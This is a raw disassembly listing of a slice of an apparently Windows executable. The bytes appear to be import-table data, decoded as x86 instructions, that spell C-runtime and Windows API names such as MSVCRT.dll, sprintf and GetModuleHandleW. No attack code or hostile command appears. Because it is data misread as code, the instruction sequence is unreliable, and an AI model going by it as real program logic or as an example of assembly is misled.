  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
